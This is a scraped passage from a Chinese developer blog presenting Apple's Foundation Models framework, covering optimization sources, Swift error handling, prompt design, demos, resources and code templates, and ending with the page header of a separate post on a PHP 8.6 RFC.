<table><thead><tr><th>优化技术</th><th>官方来源</th><th>第三方分析来源</th><th>可信度</th></tr></thead><tbody><tr><td><strong>2-bit 量化</strong></td><td>❌ 未明确提及</td><td>OneV's Den、OSCHINA</td><td>⚠️ 需验证</td></tr><tr><td><strong>推测解码</strong></td><td>❌ 未明确提及</td><td>OneV's Den、AIGC.Bar</td><td>⚠️ 需验证</td></tr><tr><td><strong>约束解码</strong></td><td>✅ WWDC 2024、官方文档</td><td>-</td><td>✅ 官方确认</td></tr><tr><td><strong>KV Cache 优化</strong></td><td>❌ 未明确提及</td><td>OneV's Den（实际测试）</td><td>⚠️ 需验证</td></tr></tbody></table>
<p><strong>⚠️ 重要说明</strong>:</p>
<ul>
<li><strong>约束解码</strong>是唯一在 Apple 官方文档和 WWDC 视频中明确提及的技术</li>
<li>其他三项优化技术（2-bit 量化、推测解码、KV Cache 优化）主要来自第三方技术分析和实际测试</li>
<li>建议在实际使用中，以官方文档和 WWDC 视频为准</li>
<li>第三方分析数据（如 OneV's Den）基于实际测试，具有较高参考价值，但非官方声明</li>
</ul>
<p><strong>🔍 验证建议</strong>:</p>
<ol>
<li>查看 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fdocumentation%2Ffoundationmodels" target="_blank" title="https://developer.apple.com/documentation/foundationmodels" ref="nofollow noopener noreferrer">Apple Developer Documentation - Foundation Models</a></li>
<li>观看 WWDC 2024 相关 Session 视频</li>
<li>使用 Instruments 工具在实际设备上验证内存占用</li>
<li>参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fonevcat.com%2F2025%2F06%2Ffoundation-models%2F" target="_blank" title="https://onevcat.com/2025/06/foundation-models/" ref="nofollow noopener noreferrer">OneV's Den 文章</a> 了解实际测试数据</li>
</ol>
<h4 data-id="heading-91">未来展望与注意事项</h4>
<p><strong>模型更新</strong>:</p>
<p>苹果明确表示模型会随着系统更新持续改进，这意味着：</p>
<ul>
<li>⚠️ <strong>Prompt 兼容性</strong>: 你针对旧版本模型调好的 prompt 可能会在新版本模型上不太适用</li>
<li>📋 <strong>测试建议</strong>: Apple 建议设定 test set，在每次模型更新时进行确认和调整</li>
<li>🔄 <strong>更新频率</strong>: 模型的更新间隔大概是半年到一年，因此每年可能会有两个新版本模型需要确认</li>
<li>🛠️ <strong>维护成本</strong>: 如果模型变化很大，可能需要针对不同的系统版本使用不同的提示词</li>
</ul>
<p><strong>macOS 限制</strong>:</p>
<p>macOS 上搭载的本地模型也是这个 3B 的小模型（同时也提供给 macOS 26 上的模拟器使用）。作为性能更加强劲的"生产力级别"设备，却使用了和手持设备一样的方案。</p>
<p><strong>开发建议</strong>:</p>
<ol>
<li><strong>现在就可以开始实验</strong>: 框架已经相当稳定</li>
<li><strong>围绕 4096 token 限制设计应用流程</strong>: 不要指望短期内会有大幅提升</li>
<li><strong>优先考虑 Tool Calling</strong>: 这可能是最有价值的功能</li>
<li><strong>准备好上下文管理策略</strong>: 如果存在对话式的场景，几乎必须处理上下文溢出</li>
<li><strong>在真机上测试性能</strong>: 模拟器版本跑的是 macOS 搭载的模型，性能结果可能不准确</li>
</ol>
<blockquote>
<p>📊 <strong>数据来源</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fonevcat.com%2F2025%2F06%2Ffoundation-models%2F" target="_blank" title="https://onevcat.com/2025/06/foundation-models/" ref="nofollow noopener noreferrer">OneV's Den - Foundation Models 边界探索</a></p>
</blockquote>
<h3 data-id="heading-92">4.4 错误处理和调试</h3>
<h4 data-id="heading-93">完整的错误处理</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD  
    Start([执行操作]) --&gt; Check[检查模型可用性]  
    Check --&gt;|不可用| Error1[模型不可用错误]  
    Check --&gt;|可用| Execute[执行操作]  
    Execute --&gt;|成功| Success[返回结果]  
    Execute --&gt;|上下文窗口超出| Error2[上下文窗口错误]  
    Execute --&gt;|工具调用失败| Error3[工具调用错误]  
    Execute --&gt;|其他错误| Error4[通用错误]  
      
    Error1 --&gt; Handle[错误处理]  
    Error2 --&gt; Handle  
    Error3 --&gt; Handle  
    Error4 --&gt; Handle  
    Handle --&gt; User[显示用户友好提示]  
      
    style Start fill:#007AFF,color:#fff  
    style Check fill:#5AC8FA,color:#000  
    style Execute fill:#FF9500,color:#fff  
    style Success fill:#34C759,color:#fff  
    style Error1 fill:#FF3B30,color:#fff  
    style Error2 fill:#FF3B30,color:#fff  
    style Error3 fill:#FF3B30,color:#fff  
    style Error4 fill:#FF3B30,color:#fff  
    style Handle fill:#AF52DE,color:#fff  
    style User fill:#5AC8FA,color:#000  
</code></pre>
<p><strong>错误处理代码</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">PhotoAnalysisError</span>: <span class="hljs-title class_">LocalizedError</span> {  
    <span class="hljs-keyword">case</span> modelUnavailable(<span class="hljs-type">String</span>)  
    <span class="hljs-keyword">case</span> contextWindowExceeded  
    <span class="hljs-keyword">case</span> invalidResponse  
    <span class="hljs-keyword">case</span> toolCallFailed(<span class="hljs-type">String</span>)  
      
    <span class="hljs-keyword">var</span> errorDescription: <span class="hljs-type">String</span>? {  
        <span class="hljs-keyword">switch</span> <span class="hljs-keyword">self</span> {  
        <span class="hljs-keyword">case</span> .modelUnavailable(<span class="hljs-keyword">let</span> reason):  
            <span class="hljs-keyword">return</span> <span class="hljs-string">"AI模型不可用: <span class="hljs-subst">\(reason)</span>"</span>  
        <span class="hljs-keyword">case</span> .contextWindowExceeded:  
            <span class="hljs-keyword">return</span> <span class="hljs-string">"对话内容过长，请清理历史记录"</span>  
        <span class="hljs-keyword">case</span> .invalidResponse:  
            <span class="hljs-keyword">return</span> <span class="hljs-string">"AI响应格式错误"</span>  
        <span class="hljs-keyword">case</span> .toolCallFailed(<span class="hljs-keyword">let</span> toolName):  
            <span class="hljs-keyword">return</span> <span class="hljs-string">"工具调用失败: <span class="hljs-subst">\(toolName)</span>"</span>  
        }  
    }  
}

<span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhotoSafely</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">PhotoDescription</span> {  
    <span class="hljs-keyword">let</span> model <span class="hljs-operator">=</span> <span class="hljs-type">SystemLanguageModel</span>.default  
    <span class="hljs-keyword">guard</span> <span class="hljs-keyword">case</span> .available <span class="hljs-operator">=</span> model.availability <span class="hljs-keyword">else</span> {  
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">case</span> .unavailable(<span class="hljs-keyword">let</span> reason) <span class="hljs-operator">=</span> model.availability {  
            <span class="hljs-keyword">throw</span> <span class="hljs-type">PhotoAnalysisError</span>.modelUnavailable(reason.localizedDescription)  
        }  
        <span class="hljs-keyword">throw</span> <span class="hljs-type">PhotoAnalysisError</span>.modelUnavailable(<span class="hljs-string">"未知原因"</span>)  
    }  
      
    <span class="hljs-keyword">do</span> {  
        <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
        <span class="hljs-keyword">let</span> prompt <span class="hljs-operator">=</span> generateAnalysisPrompt(for: photo)  
        <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
            to: <span class="hljs-type">Prompt</span>(prompt),  
            generating: <span class="hljs-type">PhotoDescription</span>.<span class="hljs-keyword">self</span>  
        )  
        <span class="hljs-keyword">return</span> response.content  
    } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">let</span> error <span class="hljs-keyword">as</span> <span class="hljs-type">LanguageModelSession</span>.<span class="hljs-type">GenerationError</span> {  
        <span class="hljs-keyword">switch</span> error {  
        <span class="hljs-keyword">case</span> .exceededContextWindowSize:  
            <span class="hljs-keyword">throw</span> <span class="hljs-type">PhotoAnalysisError</span>.contextWindowExceeded  
        <span class="hljs-keyword">default</span>:  
            <span class="hljs-keyword">throw</span> <span class="hljs-type">PhotoAnalysisError</span>.invalidResponse  
        }  
    } <span class="hljs-keyword">catch</span> <span class="hljs-keyword">let</span> error <span class="hljs-keyword">as</span> <span class="hljs-type">LanguageModelSession</span>.<span class="hljs-type">ToolCallError</span> {  
        <span class="hljs-keyword">throw</span> <span class="hljs-type">PhotoAnalysisError</span>.toolCallFailed(error.localizedDescription)  
    } <span class="hljs-keyword">catch</span> {  
        <span class="hljs-keyword">throw</span> <span class="hljs-type">PhotoAnalysisError</span>.invalidResponse  
    }  
}  
</code></pre>
<h3 data-id="heading-94">4.4 提示设计和安全实践</h3>
<h4 data-id="heading-95">提示设计最佳实践</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap  
  root((提示设计&lt;br/&gt;最佳实践))  
    清晰明确  
      角色定义  
      职责说明  
      格式要求  
    提供上下文  
      用户信息  
      当前状态  
      历史记录  
    示例引导  
      输入示例  
      输出示例  
      格式示例  
    结构化  
      分层次  
      标记重点  
      易于理解  
</code></pre>
<p><strong>Instructions设计示例</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ✅ 好的Instructions  </span>
<span class="hljs-keyword">let</span> instructions <span class="hljs-operator">=</span> <span class="hljs-type">Instructions</span>(<span class="hljs-string">"""  
你是一个专业的照片分析助手，擅长：  
1. 分析照片内容（人物、场景、物体）  
2. 评估照片质量（构图、光线、清晰度）  
3. 提供拍摄改进建议  
4. 生成准确的照片标签和描述

请保持回答简洁专业，使用中文回复。  
"""</span>)  
</code></pre>
<h4 data-id="heading-96">安全实践</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    subgraph "安全机制"  
        S1[Guardrail&lt;br/&gt;内容过滤]  
        S2[输入验证&lt;br/&gt;长度检查]  
        S3[隐私保护&lt;br/&gt;本地处理]  
    end  
      
    subgraph "实践要点"  
        P1[处理安全错误]  
        P2[验证用户输入]  
        P3[避免敏感信息]  
    end  
      
    S1 --&gt; P1  
    S2 --&gt; P2  
    S3 --&gt; P3  
      
    style S1 fill:#FF3B30,color:#fff  
    style S2 fill:#FF3B30,color:#fff  
    style S3 fill:#FF3B30,color:#fff  
    style P1 fill:#34C759,color:#fff  
    style P2 fill:#34C759,color:#fff  
    style P3 fill:#34C759,color:#fff  
</code></pre>
<hr/>
<h2 data-id="heading-97">🎬 第五部分：Demo视频展示</h2>
<h3 data-id="heading-98">Demo 1: 智能照片分析</h3>
<p><strong>演示流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram  
    participant U as 用户  
    participant UI as 界面  
    participant VM as ViewModel  
    participant AI as Foundation Models  
      
    U-&gt;&gt;UI: 选择照片  
    UI-&gt;&gt;VM: analyzePhoto(photo)  
    VM-&gt;&gt;AI: 生成分析Prompt  
    AI-&gt;&gt;AI: 分析照片内容  
    loop 流式响应  
        AI--&gt;&gt;VM: 返回部分文本  
        VM--&gt;&gt;UI: 更新UI  
    end  
    AI--&gt;&gt;VM: 返回结构化结果  
    VM--&gt;&gt;UI: 显示分析结果  
    UI--&gt;&gt;U: 展示标签、评分、建议  
</code></pre>
<p><strong>讲解要点</strong>:</p>
<ul>
<li>展示结构化数据生成的实际效果</li>
<li>说明流式响应如何提升用户体验</li>
<li>强调本地处理的隐私优势</li>
</ul>
<h3 data-id="heading-99">Demo 2: 自然语言搜索</h3>
<p><strong>演示流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram  
    participant U as 用户  
    participant AI as Foundation Models  
    participant Tool as PhotoSearchTool  
      
    U-&gt;&gt;AI: "找去年夏天在海边的照片"  
    AI-&gt;&gt;AI: 理解用户意图  
    AI-&gt;&gt;AI: 匹配工具描述  
    AI-&gt;&gt;Tool: call(Arguments)  
    Tool-&gt;&gt;Tool: 执行搜索  
    Tool--&gt;&gt;AI: 返回照片列表  
    AI-&gt;&gt;AI: 生成响应  
    AI--&gt;&gt;U: "我找到了5张照片..."  
</code></pre>
<p><strong>讲解要点</strong>:</p>
<ul>
<li>展示工具调用的工作机制</li>
<li>说明自然语言理解的优势</li>
<li>强调无需精确关键词的便利性</li>
</ul>
<h3 data-id="heading-100">Demo 3: 完整工作流</h3>
<p><strong>演示流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR  
    User([用户请求]) --&gt; AI[AI分析]  
    AI --&gt; T1[搜索照片]  
    T1 --&gt; T2[分析内容]  
    T2 --&gt; T3[创建相册]  
    T3 --&gt; Result[完成]  
      
    style User fill:#007AFF,color:#fff  
    style AI fill:#5AC8FA,color:#000  
    style T1 fill:#FF9500,color:#fff  
    style T2 fill:#FF9500,color:#fff  
    style T3 fill:#FF9500,color:#fff  
    style Result fill:#34C759,color:#fff  
</code></pre>
<p><strong>讲解要点</strong>:</p>
<ul>
<li>展示多工具协调的能力</li>
<li>说明AI如何自动判断工具调用顺序</li>
<li>强调复杂任务的一站式解决</li>
</ul>
<hr/>
<h2 data-id="heading-101">📚 第六部分：学习资源和总结 </h2>
<h3 data-id="heading-102">官方资源</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD  
    Resource[学习资源] --&gt; Official[官方资源]  
    Resource --&gt; Video[视频教程]  
    Resource --&gt; Demo[示例项目]  
      
    Official --&gt; Doc[Apple文档]  
    Official --&gt; WWDC[WWDC 2024]  
      
    Video --&gt; V1[Framework介绍]  
    Video --&gt; V2[深入理解]  
    Video --&gt; V3[编码实践]  
    Video --&gt; V4[提示和安全]  
      
    Demo --&gt; Project[Foundation Lab]  
      
    style Resource fill:#007AFF,color:#fff  
    style Official fill:#34C759,color:#fff  
    style Video fill:#FF9500,color:#fff  
    style Demo fill:#5AC8FA,color:#000  
</code></pre>
<p><strong>资源列表</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fdocumentation%2Ffoundationmodels" target="_blank" title="https://developer.apple.com/documentation/foundationmodels" ref="nofollow noopener noreferrer">Apple Developer Documentation - Foundation Models</a></li>
<li>WWDC 2024相关Session</li>
<li>示例项目：Foundation Lab</li>
</ul>
<p><strong>推荐视频</strong>:</p>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DmJMvFyBvZEk" target="_blank" title="https://www.youtube.com/watch?v=mJMvFyBvZEk" ref="nofollow noopener noreferrer">Foundation Models Framework 介绍</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D6Wgg7DIY29E" target="_blank" title="https://www.youtube.com/watch?v=6Wgg7DIY29E" ref="nofollow noopener noreferrer">深入了解 Foundation Models 框架</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DS5F196tqRMI" target="_blank" title="https://www.youtube.com/watch?v=S5F196tqRMI" ref="nofollow noopener noreferrer">实际编码实践</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D-aMFBj-kwdU" target="_blank" title="https://www.youtube.com/watch?v=-aMFBj-kwdU" ref="nofollow noopener noreferrer">探索设备端基础模型的提示设计和安全</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dz-t64Zlj1ok" target="_blank" title="https://www.youtube.com/watch?v=z-t64Zlj1ok" ref="nofollow noopener noreferrer">YouTube 分享视频</a> - 可作为补充参考，结合本文档内容观看，更好理解实际演示细节</li>
</ol>
<p><strong>深度技术分析</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fonevcat.com%2F2025%2F06%2Ffoundation-models%2F" target="_blank" title="https://onevcat.com/2025/06/foundation-models/" ref="nofollow noopener noreferrer">OneV's Den - Foundation Models：苹果设备端模型的边界探索</a> - 基于实际测试的性能数据、边界限制和最佳实践，包含内存消耗、并发性能、上下文窗口等关键指标的详细分析</li>
</ul>
<h3 data-id="heading-103">实践建议</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    Start([开始学习]) --&gt; Step1[单轮对话]  
    Step1 --&gt; Step2[结构化生成]  
    Step2 --&gt; Step3[实现Tool]  
    Step3 --&gt; Step4[业务集成]  
    Step4 --&gt; End([生产应用])  
      
    style Start fill:#007AFF,color:#fff  
    style Step1 fill:#5AC8FA,color:#000  
    style Step2 fill:#5AC8FA,color:#000  
    style Step3 fill:#FF9500,color:#fff  
    style Step4 fill:#34C759,color:#fff  
    style End fill:#007AFF,color:#fff  
</code></pre>
<hr/>
<h2 data-id="heading-104">🤔 第七部分：Q&amp;A </h2>
<h3 data-id="heading-105">常见问题对比</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB  
    Q1[Q: 和ChatGPT的区别?] --&gt; A1[完全本地化&lt;br/&gt;无需网络&lt;br/&gt;数据不出设备]  
    Q2[Q: 可用于生产?] --&gt; A2[需要iOS 18+&lt;br/&gt;设备需支持AI]  
    Q3[Q: 性能如何?] --&gt; A3[性能良好&lt;br/&gt;首次调用有延迟]  
    Q4[Q: 如何测试?] --&gt; A4[必须真机测试&lt;br/&gt;模拟器不支持]  
    Q5[Q: 成本如何?] --&gt; A5[完全免费&lt;br/&gt;无API费用]  
      
    style Q1 fill:#5AC8FA,color:#000  
    style Q2 fill:#5AC8FA,color:#000  
    style Q3 fill:#5AC8FA,color:#000  
    style Q4 fill:#5AC8FA,color:#000  
    style Q5 fill:#5AC8FA,color:#000  
    style A1 fill:#34C759,color:#fff  
    style A2 fill:#34C759,color:#fff  
    style A3 fill:#34C759,color:#fff  
    style A4 fill:#34C759,color:#fff  
    style A5 fill:#34C759,color:#fff  
</code></pre>
<h3 data-id="heading-106">讨论话题</h3>
<ul>
<li>在相册业务中，哪些场景最适合使用Foundation Models？</li>
<li>如何平衡AI能力和用户体验？</li>
<li>如何处理模型不可用的情况？</li>
</ul>
<hr/>
<h2 data-id="heading-107">📝 总结</h2>
<h3 data-id="heading-108">关键要点总结</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">mindmap  
  root((Foundation Models&lt;br/&gt;关键要点))  
    原生AI能力  
      Apple提供  
      iOS 18+  
      Apple Intelligence  
    隐私保护  
      设备端处理  
      数据不出设备  
      完全本地化  
    易于集成  
      简洁API  
      开发者友好  
      系统集成  
    应用场景  
      照片分析  
      自然语言搜索  
      智能分类  
      视频理解  
</code></pre>
<h3 data-id="heading-109">下一步行动</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    A[创建Demo] --&gt; B[选择功能]  
    B --&gt; C[集成AI]  
    C --&gt; D[收集反馈]  
    D --&gt; E[迭代优化]  
      
    style A fill:#007AFF,color:#fff  
    style B fill:#5AC8FA,color:#000  
    style C fill:#FF9500,color:#fff  
    style D fill:#34C759,color:#fff  
    style E fill:#AF52DE,color:#fff  
</code></pre>
<h3 data-id="heading-110">相册业务应用优先级</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">pie title 相册业务应用优先级  
    "高优先级" : 3  
    "中优先级" : 3  
    "低优先级" : 2  
</code></pre>
<p><strong>优先级详情</strong>:</p>
<ul>
<li><strong>高优先级</strong>: 智能照片描述生成、自然语言搜索、智能相册分类</li>
<li><strong>中优先级</strong>: 相似照片推荐、视频摘要生成、清理建议</li>
<li><strong>低优先级</strong>: 照片质量评分、自动标签生成</li>
</ul>
<hr/>
<h2 data-id="heading-111">📎 附录：代码模板</h2>
<h3 data-id="heading-112">基础会话模板</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> FoundationModels

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicSessionManager</span> {  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">chat</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">String</span> {  
        <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(to: message)  
        <span class="hljs-keyword">return</span> response.content  
    }  
}  
</code></pre>
<h3 data-id="heading-113">Tool实现模板</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyTool</span>: <span class="hljs-title class_">Tool</span> {  
    <span class="hljs-keyword">let</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"toolName"</span>  
    <span class="hljs-keyword">let</span> description <span class="hljs-operator">=</span> <span class="hljs-string">"工具描述"</span>  
      
    <span class="hljs-meta">@Generable</span>  
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Arguments</span> {  
        <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"参数描述"</span>)  
        <span class="hljs-keyword">var</span> param: <span class="hljs-type">String</span>  
    }  
      
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">arguments</span>: <span class="hljs-type">Arguments</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-keyword">some</span> <span class="hljs-type">PromptRepresentable</span> {  
        <span class="hljs-comment">// 实现工具逻辑  </span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"工具返回结果"</span>  
    }  
}  
</code></pre>
<h3 data-id="heading-114">结构化数据生成模板</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyDataModel</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"字段描述"</span>)  
    <span class="hljs-keyword">let</span> field: <span class="hljs-type">String</span>  
}

<span class="hljs-keyword">func</span> <span class="hljs-title function_">generateData</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">MyDataModel</span> {  
    <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
    <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
        to: <span class="hljs-string">"生成数据的提示词"</span>,  
        generating: <span class="hljs-type">MyDataModel</span>.<span class="hljs-keyword">self</span>  
    )  
    <span class="hljs-keyword">return</span> response.content  
}  
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PHP8.6 新的 RFC 提案 Context Managers 优雅管理资源生命周期]]></title>    <link>https://juejin.cn/post/7575112613778047010</link>    <guid>https://juejin.cn/post/7575112613778047010</guid>    <pubDate>2025-11-23T09:18:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575112613778047010" data-draft-id="7575162322240077824" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PHP8.6 新的 RFC 提案 Context Managers 优雅管理资源生命周期"/> <meta itemprop="keywords" content="后端,PHP"/> <meta itemprop="datePublished" content="2025-11-23T09:18:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PHP8.6 新的 RFC 提案 Context Managers 优雅管理资源生命周期
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T09:18:13.000Z" title="Sun Nov 23 2025 09:18:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 